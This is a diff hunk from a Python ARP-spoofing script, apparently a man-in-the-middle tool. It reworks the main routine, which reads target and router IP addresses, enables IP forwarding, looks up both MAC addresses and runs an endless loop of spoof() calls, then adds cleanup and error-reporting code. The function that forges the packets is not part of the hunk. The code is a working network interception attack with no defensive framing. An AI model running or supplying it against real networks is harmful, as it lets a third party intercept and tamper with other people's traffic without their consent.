@@ -78,41 +78,60 @@ def set_ipforward(status):
         file.write(str(status))
 
 
-if len(sys.argv) < 3:
-    target_ip = input("[+] Enter target ip address: ")
-    router_ip = input("[+] Enter router ip address: ")
-elif len(sys.argv) == 3:
-    target_ip, router_ip = sys.argv[1:]
-else:
-    print(f"syntax {sys.argv[0]} target_ip router_ip")
-    exit()
-
-print()
-print(f"target ip: {target_ip}")
-print(f"router ip: {router_ip}")
-print()
-
-if not check_ipforward():
-    print("enabling ip forward")
-    set_ipforward(1)
-
-target_mac = get_mac_address(target_ip)
-router_mac = get_mac_address(router_ip)
-
-print()
-print(f"target: ip={target_ip}, mac={target_mac}")
-print(f"router: ip={router_ip}, mac={router_mac}")
-print()
-
-try:
-    print("* * * START spoof loop * * *\n")
-    while True:
-        spoof(router_ip, target_ip, router_mac, target_mac)
-        check_ipforward()
-        time.sleep(2)
-except KeyboardInterrupt:
-    print('* * * STOP spoof loop * * *\n')
+def clean_exit():
     print("disabling ip_forward")
     set_ipforward(0)
     check_ipforward()
+    print("exit")
     exit(0)
+
+
+if __name__ == '__main__':
+
+    if len(sys.argv) < 3:
+        # target_ip = input("[+] Enter target ip address: ")
+        # router_ip = input("[+] Enter router ip address: ")
+        print(f"syntax: python {os.path.basename(sys.argv[0])} target_ip router_ip")
+        exit()
+    elif len(sys.argv) == 3:
+        target_ip, router_ip = sys.argv[1:]
+    else:
+        print(f"syntax {sys.argv[0]} target_ip router_ip")
+        exit()
+
+    print()
+    print(f"target ip: {target_ip}")
+    print(f"router ip: {router_ip}")
+    print()
+
+    try:
+        if not check_ipforward():
+            print("enabling ip forward")
+            set_ipforward(1)
+
+        target_mac = get_mac_address(target_ip)
+        router_mac = get_mac_address(router_ip)
+
+        print()
+        print(f"target: ip={target_ip}, mac={target_mac}")
+        print(f"router: ip={router_ip}, mac={router_mac}")
+        print()
+
+        print("* * * START spoof loop * * *\n")
+        while True:
+            spoof(router_ip, target_ip, router_mac, target_mac)
+            check_ipforward()
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print('* * * STOP spoof loop * * *\n')
+        clean_exit()
+    except Exception as e:
+        print()
+        print(repr(e))
+        import traceback
+        etype, eobject, etraceback = sys.exc_info()
+        tb = traceback.extract_tb(etraceback, 1)[0]
+        print(f"{tb.filename=}")
+        print(f"{tb.lineno=}")
+        print(f"{tb.line=}")
+        clean_exit()
